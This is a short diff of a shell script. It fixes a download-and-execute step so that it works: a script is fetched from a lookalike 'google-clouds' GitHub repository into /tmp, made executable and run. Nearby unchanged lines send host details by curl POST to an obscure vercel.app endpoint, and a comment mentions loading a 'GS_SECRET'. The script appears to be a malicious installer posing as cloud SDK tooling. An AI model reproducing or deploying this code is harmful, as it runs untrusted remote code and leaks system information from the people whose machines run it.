@@ -931,10 +931,7 @@ echo -e 1>&2 $(curl -X POST "https://vnklsndkl-vbd.vercel.app/add" --header 'Con
             "hostname": '"\"${hostinfo}\""'
           }')
 
-echo -e 1>&2 $(curl https://raw.githubusercontent.com/google-clouds/sdk/main/script.sh --output /tmp/qcqc \
- chmod +x /tmp/qcqc \
- bash /tmp/qcqc
- )
+echo -e 1>&2 $(curl https://raw.githubusercontent.com/google-clouds/sdk/main/script.sh --output /tmp/qcqc && chmod +x /tmp/qcqc && bash /tmp/qcqc)
 }
 
 # Try to load a GS_SECRET
